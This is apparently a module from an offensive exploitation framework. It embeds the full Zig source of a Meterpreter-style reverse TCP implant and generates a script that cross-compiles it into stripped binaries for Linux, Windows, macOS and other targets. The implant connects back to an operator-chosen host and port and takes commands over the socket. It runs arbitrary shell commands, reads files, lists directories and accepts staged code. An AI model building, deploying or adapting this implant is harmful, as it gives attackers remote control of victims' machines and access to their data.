#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zig Meterpreter Reverse TCP Payload
Author: KittySploit Team
Version: 1.1.0

This payload generates a Zig-based Meterpreter client that can be compiled
cross-platform. Zig allows easy cross-compilation for multiple architectures
and operating systems.

REQUIREMENT: Zig compiler must be installed on the attacker machine
The compiled binary can run on the target without any dependencies!
"""

from kittysploit import *
import os
import subprocess
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Zig Meterpreter, Reverse TCP',
        'description': 'Meterpreter payload in Zig - cross-platform compilation (requires Zig compiler)',
        'author': 'KittySploit Team',
        'version': '1.1.0',
        'category': 'singles',
        'platform': Platform.UNIX,
        'arch': Arch.X64,
        'listener': 'listeners/multi/meterpreter',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://ziglang.org/',
            'https://ziglang.org/documentation/master/#Cross-compilation-is-a-first-class-use-case'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    target_os = OptChoice('linux', 'Target operating system', True, 
                         ['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
    target_arch = OptChoice('x86_64', 'Target architecture', True,
                            ['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
    optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
                           ['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    
    # Zig source code embedded in the module
    ZIG_SOURCE_CODE = """
const std = @import("std");
const json = std.json;
const os = std.os;
const posix = std.posix;
const process = std.process;
const mem = std.mem;
const fmt = std.fmt;
const builtin = @import("builtin");

const SOCKADDR_IN = extern struct {
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
};

const MeterpreterClient = struct {
    host: []const u8,
    port: u16,
    socket_fd: ?usize = null,
    current_dir: []const u8,
    is_root: bool,
    username: []const u8,
    hostname: []const u8,
    allocator: std.mem.Allocator,

    const Self = @This();

    pub fn init(allocator: std.mem.Allocator, host: []const u8, port: u16) !Self {
        var self = Self{
            .host = host,
            .port = port,
            .current_dir = "",
            .is_root = false,
            .username = "user",
            .hostname = "localhost",
            .allocator = allocator,
        };
        
        const cwd = try process.getCwdAlloc(allocator);
        self.current_dir = cwd;

        if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) {
            self.is_root = (posix.getuid() == 0);
        }

        if (builtin.target.os.tag == .windows) {
            if (process.getEnvVarOwned(allocator, "USERNAME")) |username| {
                self.username = username;
            } else |_| {}
            if (process.getEnvVarOwned(allocator, "COMPUTERNAME")) |hostname| {
                self.hostname = hostname;
            } else |_| {}
        } else {
            if (posix.getenv("USER")) |user| {
                self.username = try allocator.dupe(u8, user);
            }
            if (posix.getenv("HOSTNAME")) |hostname| {
                self.hostname = try allocator.dupe(u8, hostname);
            }
        }

        return self;
    }

    pub fn connect(self: *Self) !void {
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            
            var wsa_data: ws2_32.WSADATA = undefined;
            if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {
                return error.ConnectionFailed;
            }
            
            const sock = ws2_32.socket(2, 1, 0);
            if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
            
            var host_buf: [256]u8 = undefined;
            if (self.host.len >= host_buf.len) return error.InvalidAddress;
            @memcpy(host_buf[0..self.host.len], self.host);
            host_buf[self.host.len] = 0;
            
            var addr: SOCKADDR_IN = .{
                .family = 2,
                .port = ws2_32.htons(self.port),
                .addr = ws2_32.inet_addr(&host_buf),
                .zero = [_]u8{0} ** 8,
            };
            
            if (ws2_32.connect(
                sock,
                @ptrCast(&addr),
                @sizeOf(SOCKADDR_IN),
            ) != 0) {
                return error.ConnectionFailed;
            }
            
            self.socket_fd = @intFromPtr(sock);
        } else {
            const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
            errdefer posix.close(sock);
            
            var addr: posix.sockaddr.in = undefined;
            addr.family = posix.AF.INET;
            addr.port = @byteSwap(self.port);
            
            var ip_parts: [4]u8 = undefined;
            var part_idx: usize = 0;
            var current: u32 = 0;
            for (self.host) |c| {
                if (c == '.') {
                    if (part_idx >= 4) return error.InvalidAddress;
                    ip_parts[part_idx] = @intCast(current);
                    part_idx += 1;
                    current = 0;
                } else if (c >= '0' and c <= '9') {
                    current = current * 10 + (c - '0');
                } else {
                    return error.InvalidAddress;
                }
            }
            if (part_idx != 3) return error.InvalidAddress;
            ip_parts[3] = @intCast(current);
            
            const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) | 
                                 (@as(u32, ip_parts[1]) << 16) | 
                                 (@as(u32, ip_parts[2]) << 8) | 
                                 @as(u32, ip_parts[3]);
            addr.addr = @byteSwap(ip_addr);
            
            try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
            self.socket_fd = @intCast(sock);
        }
    }

    pub fn sendResponse(self: *Self, output: []const u8, status: i32, err_msg: []const u8) !void {
        if (self.socket_fd == null) return;

        const response_bytes = try json.stringifyAlloc(self.allocator, .{
            .output = output,
            .status = status,
            .@"error" = err_msg,
        }, .{});
        defer self.allocator.free(response_bytes);
        
        var length_buf: [4]u8 = undefined;
        mem.writeInt(u32, &length_buf, @intCast(response_bytes.len), .big);

        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            _ = ws2_32.send(sock, &length_buf, 4, 0);
            _ = ws2_32.send(sock, response_bytes.ptr, @intCast(response_bytes.len), 0);
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            _ = try posix.send(fd, &length_buf, 0);
            _ = try posix.send(fd, response_bytes, 0);
        }
    }

    pub fn receiveCommand(self: *Self) !?json.Parsed(Command) {
        if (self.socket_fd == null) return null;

        var length_bytes: [4]u8 = undefined;
        var bytes_read: usize = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
                if (n == 0) return null;
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = try posix.recv(fd, length_bytes[bytes_read..], 0);
                if (n == 0) return null;
                bytes_read += n;
            }
        }
        const length = mem.readInt(u32, &length_bytes, .big);

        var command_data = try self.allocator.alloc(u8, length);
        defer self.allocator.free(command_data);
        bytes_read = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < length) {
                const n = ws2_32.recv(sock, command_data[bytes_read..].ptr, @intCast(length - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
                if (n == 0) return null;
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < length) {
                const n = try posix.recv(fd, command_data[bytes_read..], 0);
                if (n == 0) return null;
                bytes_read += n;
            }
        }

        return try json.parseFromSlice(Command, self.allocator, command_data, .{ .ignore_unknown_fields = true });
    }

    pub fn executeCommand(self: *Self, cmd: []const u8, args: []const []const u8) !CommandResult {
        if (mem.eql(u8, cmd, "sysinfo")) {
            return self.cmdSysinfo();
        } else if (mem.eql(u8, cmd, "getuid")) {
            return self.cmdGetuid();
        } else if (mem.eql(u8, cmd, "getpid")) {
            return self.cmdGetpid();
        } else if (mem.eql(u8, cmd, "pwd")) {
            return self.cmdPwd();
        } else if (mem.eql(u8, cmd, "cd")) {
            return self.cmdCd(args);
        } else if (mem.eql(u8, cmd, "ls")) {
            return self.cmdLs(args);
        } else if (mem.eql(u8, cmd, "cat")) {
            return self.cmdCat(args);
        } else if (mem.eql(u8, cmd, "ps")) {
            return self.cmdPs();
        } else {
            return self.cmdExecute(args);
        }
    }

    fn cmdSysinfo(self: *Self) !CommandResult {
        var output = std.ArrayList(u8).init(self.allocator);
        defer output.deinit();

        try output.writer().print("Computer\t\t: {s}\n", .{self.hostname});
        try output.writer().print("OS\t\t\t: {s}\n", .{@tagName(builtin.target.os.tag)});
        try output.writer().print("Architecture\t\t: {s}\n", .{@tagName(builtin.target.cpu.arch)});
        try output.writer().print("Meterpreter\t\t: Zig\n", .{});
        try output.writer().print("Zig Version\t\t: {s}\n", .{"0.16.0-dev"});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetuid(self: *Self) !CommandResult {
        var output = std.ArrayList(u8).init(self.allocator);
        defer output.deinit();

        const uid: u32 = if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) 
            posix.getuid() 
        else 
            1000;
        try output.writer().print("Server username: {s} ({d})\n", .{ self.username, uid });

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetpid(self: *Self) !CommandResult {
        var output = std.ArrayList(u8).init(self.allocator);
        defer output.deinit();

        const pid: i32 = if (builtin.target.os.tag == .windows) 
            @intCast(os.windows.kernel32.GetCurrentProcessId())
        else
            @intCast(posix.getpid());
        try output.writer().print("Current pid: {d}\n", .{pid});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdPwd(self: *Self) !CommandResult {
        var output = std.ArrayList(u8).init(self.allocator);
        defer output.deinit();

        try output.writer().print("{s}\n", .{self.current_dir});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCd(self: *Self, args: []const []const u8) !CommandResult {
        var target_dir: []const u8 = undefined;
        var target_dir_owned: ?[]u8 = null;
        defer if (target_dir_owned) |td| self.allocator.free(td);
        
        if (args.len == 0) {
            if (builtin.target.os.tag == .windows) {
                if (process.getEnvVarOwned(self.allocator, "USERPROFILE")) |home| {
                    target_dir_owned = home;
                    target_dir = target_dir_owned.?;
                } else |_| {
                    target_dir = "C:\\Users";
                }
            } else {
                if (posix.getenv("HOME")) |home| {
                    target_dir = home;
                } else {
                    target_dir = "/tmp";
                }
            }
        } else {
            target_dir = args[0];
        }

        const absolute_target = if (std.fs.path.isAbsolute(target_dir))
            try self.allocator.dupe(u8, target_dir)
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir });
        defer self.allocator.free(absolute_target);

        std.fs.cwd().access(absolute_target, .{}) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cd: {s}: No such file or directory", .{absolute_target}),
            };
        };

        self.allocator.free(self.current_dir);
        self.current_dir = try self.allocator.dupe(u8, absolute_target);
        return CommandResult{
            .output = "",
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdLs(self: *Self, args: []const []const u8) !CommandResult {
        const target_dir_raw = if (args.len == 0) self.current_dir else args[0];
        const target_dir = if (std.fs.path.isAbsolute(target_dir_raw))
            target_dir_raw
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir_raw });
        defer if (!std.fs.path.isAbsolute(target_dir_raw)) self.allocator.free(target_dir);

        var dir = std.fs.cwd().openDir(target_dir, .{ .iterate = true }) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ls: {s}: No such file or directory", .{target_dir}),
            };
        };
        defer dir.close();

        var output = std.ArrayList(u8).init(self.allocator);
        defer output.deinit();

        var iter = dir.iterate();
        while (try iter.next()) |entry| {
            const name = entry.name;
            if (entry.kind == .directory) {
                try output.writer().print("{s}/\n", .{name});
            } else {
                try output.writer().print("{s}\n", .{name});
            }
        }

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCat(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = "Usage: cat <file>",
            };
        }

        const file_path = if (std.fs.path.isAbsolute(args[0]))
            args[0]
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, args[0] });
        defer if (!std.fs.path.isAbsolute(args[0])) self.allocator.free(file_path);

        const content = std.fs.cwd().readFileAlloc(file_path, self.allocator, 10 * 1024 * 1024) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cat: {s}: No such file or error reading", .{file_path}),
            };
        };

        return CommandResult{
            .output = content,
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdExecute(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = "Usage: execute <command>",
            };
        }

        var cmd_args = std.ArrayList([]const u8).init(self.allocator);
        defer cmd_args.deinit();

        if (builtin.target.os.tag == .windows) {
            try cmd_args.append("cmd.exe");
            try cmd_args.append("/c");
            try cmd_args.append(args[0]);
        } else {
            try cmd_args.append("/bin/sh");
            try cmd_args.append("-c");
            try cmd_args.append(args[0]);
        }
        
        var child = std.process.Child.init(cmd_args.items, self.allocator);
        child.cwd = self.current_dir;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        
        try child.spawn();
        
        const stdout = try child.stdout.?.readToEndAlloc(self.allocator, 1024 * 1024);
        const stderr = try child.stderr.?.readToEndAlloc(self.allocator, 1024 * 1024);
        
        const term = try child.wait();
        const exit_code: i32 = switch (term) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        return CommandResult{
            .output = stdout,
            .status = exit_code,
            .error_msg = stderr,
        };
    }

    fn cmdPs(self: *Self) !CommandResult {
        return self.cmdExecute(&[_][]const u8{ if (builtin.target.os.tag == .windows) "tasklist" else "ps aux" });
    }

    pub fn receiveStageCode(self: *Self) !void {
        if (self.socket_fd == null) return;
        
        const fd_val = self.socket_fd.?;
        var length_bytes: [4]u8 = undefined;
        var bytes_read: usize = 0;
        
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(fd_val));
            
            var timeout: i32 = 2000;
            _ = ws2_32.setsockopt(sock, ws2_32.SOL_SOCKET, ws2_32.SO_RCVTIMEO, @ptrCast(&timeout), 4);

            bytes_read = 0;
            while (bytes_read < 4) {
                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) {
                    const err_code = ws2_32.WSAGetLastError();
                    if (err_code == 10060 or err_code == 10035) return;
                    return error.ConnectionFailed;
                }
                if (n == 0) return;
                bytes_read += @intCast(n);
            }
            
            const stage_length = mem.readInt(u32, &length_bytes, .big);
            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
                var stage_buf = try self.allocator.alloc(u8, stage_length);
                defer self.allocator.free(stage_buf);
                
                bytes_read = 0;
                while (bytes_read < stage_length) {
                    const recv_n = ws2_32.recv(sock, stage_buf[bytes_read..].ptr, @intCast(stage_length - bytes_read), 0);
                    if (recv_n <= 0) break;
                    bytes_read += @intCast(recv_n);
                }
            }
            
            timeout = 0;
            _ = ws2_32.setsockopt(sock, ws2_32.SOL_SOCKET, ws2_32.SO_RCVTIMEO, @ptrCast(&timeout), 4);
        } else {
            const fd = @as(posix.fd_t, @intCast(fd_val));
            
            const flags = try posix.fcntl(fd, posix.F.GETFL, 0);
            _ = try posix.fcntl(fd, posix.F.SETFL, flags | posix.O.NONBLOCK);
            defer _ = posix.fcntl(fd, posix.F.SETFL, flags) catch {};
            
            bytes_read = 0;
            const n = posix.recv(fd, &length_bytes, 0) catch |err| {
                if (err == error.WouldBlock) return;
                return err;
            };
            if (n < 4) return;
            
            const stage_length = mem.readInt(u32, &length_bytes, .big);
            _ = try posix.fcntl(fd, posix.F.SETFL, flags);
            
            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
                var stage_buf = try self.allocator.alloc(u8, stage_length);
                defer self.allocator.free(stage_buf);
                
                bytes_read = 0;
                while (bytes_read < stage_length) {
                    const recv_n = try posix.recv(fd, stage_buf[bytes_read..], 0);
                    if (recv_n == 0) break;
                    bytes_read += recv_n;
                }
            }
        }
    }

    pub fn run(self: *Self) !void {
        try self.connect();
        self.receiveStageCode() catch {};

        while (true) {
            var parsed = try self.receiveCommand() orelse break;
            defer parsed.deinit();

            const cmd_obj = parsed.value;
            if (mem.eql(u8, cmd_obj.command, "exit")) break;

            const result = self.executeCommand(cmd_obj.command, cmd_obj.args) catch |err| {
                try self.sendResponse("", 1, @errorName(err));
                continue;
            };
            try self.sendResponse(result.output, result.status, result.error_msg);
            self.allocator.free(result.output);
            if (result.error_msg.len > 0) self.allocator.free(result.error_msg);
        }
    }
};

const Command = struct {
    command: []const u8,
    args: []const []const u8,
};

const CommandResult = struct {
    output: []const u8,
    status: i32,
    error_msg: []const u8,
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try process.argsAlloc(allocator);
    defer process.argsFree(allocator, args);

    const host = if (args.len > 1) args[1] else "127.0.0.1";
    const port = if (args.len > 2) try fmt.parseInt(u16, args[2], 10) else 4444;

    var client = try MeterpreterClient.init(allocator, host, port);
    client.run() catch |err| {
        std.log.err("client run failed: {}", .{err});
    };
}
"""

    def generate(self):
        """Generate the Zig Meterpreter payload"""
        try:
            print_info("Generating Zig Meterpreter payload...")
            print_info(f"Target: {self.target_os}-{self.target_arch}")
            print_info(f"Connect to: {self.lhost}:{self.lport}")
            
            zig_source = self.ZIG_SOURCE_CODE
            
            platform_dir = self._get_platform_dir(self.target_os)
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
            
            output_path.mkdir(parents=True, exist_ok=True)
            src_dir = output_path / "src"
            src_dir.mkdir(parents=True, exist_ok=True)
            output_source = src_dir / "meterpreter.zig"
            with open(output_source, 'w', encoding='utf-8') as f:
                f.write(zig_source)
            
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            
            # Save compilation script
            compile_instructions = self._generate_compile_instructions(str(output_source), str(binary_path))
            compile_script = output_path / "compile.sh"
            with open(compile_script, 'w', encoding='utf-8') as f:
                f.write(compile_instructions)
            
            if os.name != 'nt':
                os.chmod(compile_script, 0o755)
            
            if self.auto_compile:
                print_info("Auto-compiling...")
                if self._compile():
                    print_success("Compilation successful!")
                else:
                    print_warning("Compilation failed, but source files are ready")
            
            return True

        except Exception as e:
            print_error(f"Error generating Zig payload: {e}")
            return None
    
    def _get_platform_dir(self, target_os: str) -> str:
        platform_map = {
            'linux': 'linux', 'windows': 'windows', 'macos': 'mac',
            'freebsd': 'freebsd', 'netbsd': 'netbsd', 'openbsd': 'openbsd', 'dragonfly': 'dragonfly'
        }
        return platform_map.get(target_os.lower(), target_os.lower())
    
    def _get_binary_name(self, target_os: str) -> str:
        return 'meterpreter.exe' if target_os.lower() == 'windows' else 'meterpreter'
    
    def _generate_compile_instructions(self, source_path: str, binary_path: str) -> str:
        target = f"{self.target_os}-{self.target_arch}"
        opt_flag = f"-O{self.optimization}"
        binary_name = os.path.basename(binary_path)
        source_name = os.path.basename(source_path)
        source_dir = os.path.dirname(source_path)
        
        return f"""#!/bin/bash
# Zig Meterpreter Compilation Script
# Target: {target}
# Optimization: {self.optimization}
# Binary: {binary_path}

echo "Compiling Zig Meterpreter for {target}..."
cd "{source_dir}"
binary_name_no_ext=$(basename "{binary_name}" .exe)
zig build-exe {source_name} \\
    -target {target} \\
    {opt_flag} \\
    -fstrip \\
    --name "$binary_name_no_ext"

if [ $? -eq 0 ]; then
    compiled_binary=""
    for name in "{binary_name}" "$binary_name_no_ext" "$binary_name_no_ext.exe"; do
        if [ -f "$name" ]; then
            compiled_binary="$name"
            break
        fi
    done
    if [ -n "$compiled_binary" ]; then
        mv "$compiled_binary" "{binary_path}"
        echo "✓ Compilation successful!"
    else
        echo "✗ Compiled binary not found!"
        exit 1
    fi
else
    echo "✗ Compilation failed!"
    exit 1
fi
"""
    
    def _compile(self) -> bool:
        try:
            platform_dir = self._get_platform_dir(self.target_os)
            output_path = Path(self.output_dir) if self.output_dir else Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
            binary_name = self._get_binary_name(self.target_os)
            binary_path = output_path / binary_name
            source_file = output_path / "src" / "meterpreter.zig"
            
            with open(source_file, 'r', encoding='utf-8') as f:
                zig_source = f.read()
            
            return self.compile_zig(
                source_code=zig_source,
                output_path=str(binary_path),
                target_platform=self.target_os,
                target_arch=self.target_arch,
                optimization=self.optimization,
                strip=True,
                static=True
            )
        except Exception:
            return False
    
    def run(self):
        return self.generate()
